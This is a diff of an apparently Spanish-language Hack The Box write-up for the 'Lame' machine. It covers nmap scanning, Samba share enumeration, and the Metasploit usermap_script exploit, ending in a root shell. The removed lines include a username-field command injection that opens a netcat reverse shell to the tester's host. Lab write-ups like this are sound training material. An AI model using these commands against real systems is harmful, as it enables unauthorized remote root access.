@@ -25,6 +25,8 @@ tags:
 ---
 ## Information Gathering
 
+El análisis inicial comienza con el comando ping para confirmar la accesibilidad de la máquina objetivo en la red.
+
 ```terminal
 /home/kali/Documents/htb/machines/lame:-$ ping -c 1 10.10.10.3
 PING 10.10.10.3 (10.10.10.3) 56(84) bytes of data.
@@ -34,11 +36,17 @@ PING 10.10.10.3 (10.10.10.3) 56(84) bytes of data.
 1 packets transmitted, 1 received, 0% packet loss, time 0ms
 rtt min/avg/max/mdev = 302.848/302.848/302.848/0.000 ms
 ```
+
+Realizo un escaneo agresivo de puertos con nmap, lo que me permite identificar rápidamente todos los puertos abiertos.
+
 ```terminal
 /home/kali/Documents/htb/machines/lame:-$ sudo nmap -p- -sS --min-rate 5000 -vvv -n -Pn 10.10.10.3 -oG map1
 Host: 10.10.10.3 ()     Status: Up
 Host: 10.10.10.3 ()     Ports: 21/open/tcp//ftp///, 22/open/tcp//ssh///, 139/open/tcp//netbios-ssn///, 445/open/tcp//microsoft-ds///, 3632/open/tcp//distccd///
 ```
+
+Profundizo en los puertos detectados, recopilando información detallada sobre los servicios y versiones en ejecución.
+
 ```terminal
 /home/kali/Documents/htb/machines/lame:-$ sudo nmap -sCV -p21,22,139,445,3632 -vvv -oN map2 10.10.10.3
 PORT     STATE SERVICE     REASON         VERSION
@@ -91,101 +99,62 @@ Host script results:
 |_  message_signing: disabled (dangerous, but default)
 |_clock-skew: mean: 2h00m26s, deviation: 2h49m45s, median: 23s
 ```
+
 ---
 ## Vulnerability Exploitation
 
-Listo los recursos compartidos disponibles en el servidor SMB. No requiero credenciales.
-
-```terminal
-/home/kali/Documents/htb/machines/lame:-$ smbclient -L \\10.10.10.3
-Password for [WORKGROUP\kali]:
-Anonymous login successful
-
-        Sharename       Type      Comment
-        ---------       ----      -------
-        print$          Disk      Printer Drivers
-        tmp             Disk      oh noes!
-        opt             Disk      
-        IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
-        ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))
-Reconnecting with SMB1 for workgroup listing.
-Anonymous login successful
-
-        Server               Comment
-        ---------            -------
-
-        Workgroup            Master
-        ---------            -------
-        WORKGROUP            LAME
-```
-Con Smbmap enumero los recursos compartidos, 'tmp' tiene permisos de lectura y escritura. Hay que ejecutar el comando varias veces, ya que puede no detectar el host.
+Con Smbmap enumero los recursos compartidos, 'tmp' tiene permisos de lectura y escritura.
 
 ```terminal
 /home/kali/Documents/htb/machines/lame:-$ smbmap -H 10.10.10.3
+[+] IP: 10.10.10.3:445  Name: 10.10.10.3                Status: Authenticated
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        print$                                                  NO ACCESS       Printer Drivers
+        tmp                                                     READ, WRITE     oh noes!
+        opt                                                     NO ACCESS
+        IPC$                                                    NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
+        ADMIN$                                                  NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
 ```
-
-![](/assets/img/htb-writeup-lame/lame2.png)
-
-Accedo al recurso 'tmp' y listo el contenido.
 
 ```terminal
-/home/kali/Documents/htb/machines/lame:-$ smbclient -N \\\\10.10.10.3\\tmp
+/home/kali/Documents/htb/machines/lame:-$ searchsploit Samba 3.0.20
+-------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                          |  Path
+-------------------------------------------------------------------------------------------------------- ---------------------------------
+Samba 3.0.10 < 3.3.5 - Format String / Security Bypass                                                  | multiple/remote/10095.txt
+Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                        | unix/remote/16320.rb
+Samba < 3.0.20 - Remote Heap Overflow                                                                   | linux/remote/7701.txt
+Samba < 3.6.2 (x86) - Denial of Service (PoC)                                                           | linux_x86/dos/36741.py
+-------------------------------------------------------------------------------------------------------- ---------------------------------
 ```
-
-![](/assets/img/htb-writeup-lame/lame3.png)
 
 ---
 ## Privilege Escalation
 
-Utilizo Netcat y Smbclient para ejecutar código remoto y conseguir una shell con privilegios elevados.
-
-La vulnerabilidad se encuentra en el servicio 'distccd' del puerto 3632.
-
 ```terminal
-/home/kali/Documents/htb/machines/lame:-$ nc -lnvp 1234
-	listening on [any] 1234 ...
-```
-```terminal
-smb: \> logon "/=`nc 10.10.16.92 1234 -e /bin/sh`"
-Password: 
-session setup failed: NT_STATUS_IO_TIMEOUT
+$ msfconsole
 
-	... 10.10.10.3: inverse host lookup failed: Unknown host
-	connect to [10.10.16.92] from (UNKNOWN) [10.10.10.3] 60063
+msf6 > search Samba 3.0.20
 
-whoami
-root
-```
-Creo una shell interactiva con python.
+msf6 > use 0
 
-```terminal
-which python
-/usr/bin/python
+msf6 exploit(multi/samba/usermap_script) > show options
+
+msf6 exploit(multi/samba/usermap_script) > set RHOSTS 10.10.10.3
+
+msf6 exploit(multi/samba/usermap_script) > set LHOST 10.10.15.88
+
+msf6 exploit(multi/samba/usermap_script) > exploit
+
 python -c 'import pty; pty.spawn("/bin/bash")'
-root@lame:/# export TERM=xterm
+
+root@lame:/# id
+uid=0(root) gid=0(root)
 
 root@lame:/# cat /home/makis/user.txt
 
 root@lame:/# cat /root/root.txt
-```
-
-### Alternativa con Metasploit. 
-
-```terminal
-/home/kali/Documents/htb/machines/lame:-$ msfconsole
-
-msf6 > search samba 3.0.20
-0  exploit/multi/samba/usermap_script 2007-05-14 excellent No Samba "username map script"
-Command Execution
-	
-msf6 > use 0
-msf6 exploit(multi/samba/usermap_script) > show options
-
-msf6 exploit(multi/samba/usermap_script) > set RHOSTS 10.10.10.3
-RHOSTS => 10.10.10.3
-msf6 exploit(multi/samba/usermap_script) > set LHOST tun0
-LHOST => 10.10.16.92
-msf6 exploit(multi/samba/usermap_script) > exploit
 ```
 
 > <a href="https://www.hackthebox.com/achievement/machine/1521382/1" target="_blank">Lame Machine from Hack The Box has been Pwned</a>
